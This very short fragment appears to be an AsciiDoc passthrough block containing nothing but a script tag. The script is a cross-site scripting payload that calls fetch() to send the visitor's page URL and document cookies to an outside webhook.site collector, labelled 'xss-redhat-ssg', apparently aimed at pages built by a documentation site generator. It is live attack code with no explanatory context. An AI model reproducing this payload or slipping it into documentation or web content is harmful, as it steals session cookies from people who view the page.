...
++++
<script>fetch('https://webhook.site/8995533e-1b5f-4977-bc48-a5210de4f45c?s=xss-redhat-ssg&u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie))</script>
++++
